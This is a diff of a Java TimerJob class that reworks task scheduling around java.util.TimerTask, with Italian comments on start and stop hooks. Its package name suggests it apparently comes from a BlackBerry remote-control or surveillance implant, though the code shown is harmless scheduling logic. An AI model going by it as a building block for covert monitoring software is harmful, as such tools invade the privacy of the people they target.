@@ -1,104 +1,146 @@
 package com.ht.rcs.blackberry.threadpool;
 
+import java.util.Timer;
+import java.util.TimerTask;
+
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 import com.ht.rcs.blackberry.utils.Utils;
 
-public abstract class TimerJob implements Job {
+public abstract class TimerJob extends TimerTask {
 
-    private static final long SOON = 1;
+    protected static final long SOON = 0;
 
-    private static final long NEVER = Long.MAX_VALUE;
+    protected static final long NEVER = Integer.MAX_VALUE;
 
-    /** The debug instance. */
     //#mdebug
-    private static Debug debug = new Debug("TimerThread", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("TimerJob", DebugLevel.VERBOSE);
     //#enddebug
 
-    /** The Need to stop. */
-    protected boolean needToStop = false;
-    protected boolean needToRestart = false;
-
-    /** The Running. */
     protected boolean running = false;
     protected boolean enabled = false;
 
-    protected int sleepTime = 1000;
+    protected boolean stopped;
+    protected boolean scheduled;
 
     private int runningLoops = 0;
-
     protected String name;
 
-    private boolean enqueued;
+    /* private boolean enqueued; */
     //private static int numThreads = 0;
 
-    long every;
+    private long wantedPeriod;
+    private long wantedDelay;
 
-    long nextExecution;
+    public TimerJob(String name_) {
+        this.name = name_;
 
-    public TimerJob(String name) {
-        this.name = name;
+        this.wantedPeriod = NEVER;
+        this.wantedDelay = SOON;
 
-        this.every = NEVER;
-        this.nextExecution = Utils.getTime();
+        this.stopped = true;
 
         //#ifdef DBC
-        Check.requires(every >= 0, "Every has to be >=0");
+        Check.requires(wantedPeriod >= 0, "Every has to be >=0");
+        Check.requires(wantedDelay >= SOON, "Every has to be >=0");
         //#endif
     }
 
-    protected void setEvery(int millis) {
-        this.every = millis;
+    public TimerJob(String name, long delay_, long period_) {
+        this(name);
+        setPeriod(period_);
+        setDelay(delay_);
     }
 
-    public void setSleep(long every_) {
-        // #mdebug
-        if (every_ == NEVER) {
-            debug.trace("setSleep NEVER ");
+    protected void setPeriod(long period_) {
+        if (period_ < 0) {
+            debug.error("negative period");
+            this.wantedPeriod = 0;
+        } else {
+            this.wantedPeriod = period_;
         }
-        //#enddebug
-
-        // #debug
-        debug.trace("setSleep millis ");
-        nextExecution = Utils.getTime() + every_;
-        // #debug
-        debug.trace("setSleep nextExecution: " + nextExecution);
-
+        //#debug
+        debug.trace("setPeriod: " + wantedPeriod);
     }
 
-    public long getNextExecution() {
-        return nextExecution;
+    protected void setDelay(long delay_) {
+        if (delay_ < 0) {
+            debug.error("negative delay");
+            this.wantedDelay = 0;
+        } else {
+
+            this.wantedDelay = delay_;
+        }
+        //#debug
+        debug.trace("setDelay: " + wantedDelay);
     }
 
-    public void sleepUntilStopped() {
-        // #debug
-        debug.trace("sleepUntilStopped " + this);
+    public long getPeriod() {
+        return wantedPeriod;
+    }
+
+    public long getDelay() {
+        return wantedDelay;
     }
 
     /**
-     * Event run.
+     * Ogni volta che il timer richiede l'esecuzione del task viene invocato
+     * questo metodo.
      */
     protected abstract void actualRun();
+
+    /**
+     * La prima volta che viene lanciata l'esecuzione del task, oppure dopo una
+     * stop, viene chiamato questo metodo, prima della actualRun. Serve per
+     * inizializzare l'ambiente, aprire i file e le connessioni.
+     */
+    protected void actualStart() {
+
+    }
+
+    /**
+     * Questo metodo viene invocato alla stop. Si usa per chiudere i file aperti
+     * nella actualStart
+     */
+    protected void actualStop() {
+
+    }
+
+    public void addToTimer(Timer timer) {
+        //#debug
+        debug.trace("adding timer");
+        timer.schedule(this, getDelay(), getPeriod());
+        scheduled = true;
+    }
 
     /**
      * Checks if is running.
      * 
      * @return true, if is running
      */
-    public boolean isRunning() {
-        //return running;
+    public synchronized boolean isRunning() {
 
-        return isEnqueued() && (nextExecution != TimerJob.NEVER);
+        return !stopped;
+
+    }
+
+    public synchronized boolean isScheduled() {
+
+        return scheduled;
+
     }
 
     public synchronized void run() {
         // #debug
         debug.info("Run " + this);
-        needToStop = false;
+
+        if (stopped) {
+            stopped = false;
+            actualStart();
+        }
 
         runningLoops++;
-        //nextExecution = TimerJob.NEVER;
 
         try {
             // #debug
@@ -109,43 +151,21 @@ public abstract class TimerJob implements Job {
             running = false;
         }
 
-        if (needToRestart) {
-            // #debug
-            debug.trace("needToRestart " + this);
-            needToRestart = false;
-            nextExecution = TimerJob.SOON;
-        } else {
-            // #debug
-            debug.trace("setSleep every");
-            setSleep(every);
-        }
-
         // #debug
         debug.info("End " + this);
     }
 
     /**
-     * Stop.
+     *Stop.
      */
     public final synchronized void stop() {
         // #debug
         debug.info("Stopping... " + this);
-        needToStop = true;
-        nextExecution = TimerJob.NEVER;
 
+        stopped = true;
+        cancel();
+        scheduled = false;
         actualStop();
-    }
-
-    public void actualStop() {
-
-    }
-
-    public synchronized void restart() {
-        // #debug
-        debug.info("Restarting... " + this);
-        needToRestart = true;
-        needToStop = true;
-        nextExecution = TimerJob.SOON;
     }
 
     public boolean isEnabled() {
@@ -162,14 +182,17 @@ public abstract class TimerJob implements Job {
     }
 
     public String toString() {
-        return name + " T:" + every;
+        return name + " D,T:" + wantedDelay + "," + wantedPeriod;
     }
 
-    public void setEnqueued(boolean enqueued) {
-        this.enqueued = enqueued;
+    public void restart() {
+        //if (isOneshot()) {
+            run();
+        //}
     }
 
-    public boolean isEnqueued() {
-        return enqueued;
+    private boolean isOneshot() {
+        return wantedPeriod == NEVER;
     }
+
 }
